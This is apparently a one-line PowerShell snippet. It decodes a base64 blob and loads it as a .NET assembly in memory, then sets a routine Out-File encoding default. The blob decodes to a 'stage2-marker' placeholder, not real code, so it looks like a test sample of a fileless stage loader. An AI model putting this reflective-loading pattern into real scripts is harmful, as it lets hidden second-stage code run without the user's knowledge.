
$StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjozYnQ2MWJjNGEx"); Write-Verbose ("Assembly bytes: " + $StageBytes.Length); [Reflection.Assembly]::Load($StageBytes); $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
